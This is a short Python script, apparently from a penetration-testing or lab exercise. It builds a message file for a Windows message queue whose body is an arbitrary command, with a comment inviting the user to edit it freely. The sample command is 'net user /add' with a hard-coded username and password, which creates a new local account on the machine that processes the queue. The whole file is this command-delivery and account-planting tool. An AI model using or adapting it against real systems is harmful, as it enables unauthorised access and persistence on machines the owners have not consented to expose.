#!/usr/bin/env python3
"""
Drop your command here — no shell quoting needed.
Run: python3 send_cmd.py
"""
from build_message import build

build(
    dest_queue = "OS:a04bm02\\q",
    label      = "ops-task",
    body_text  = "net user /add cla2026ipt 'ump313aing#U73'",   # <-- edit this line freely
    priority   = 5,
    out_path   = "cmd_message.bin",
)
